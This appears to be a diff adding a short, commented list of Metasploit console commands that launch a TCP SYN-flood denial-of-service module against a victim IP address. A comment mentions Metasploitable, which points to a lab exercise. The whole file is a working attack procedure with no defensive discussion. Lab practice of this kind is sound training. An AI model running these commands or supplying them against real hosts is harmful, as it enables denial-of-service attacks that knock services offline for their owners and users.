@@ -1,0 +1,11 @@
+// open metasploit
+sudo msfconsole 
+// use synflood auxiliary module
+use auxiliary/dos/tcp/synflood
+// to see current options
+show options
+// set the victim IP, get it with ifconfig on metasploitable
+set rhost 10.10.15.1 // the victim's IP
+// victim's port canbe changed aswell
+// run the exploit
+exploit
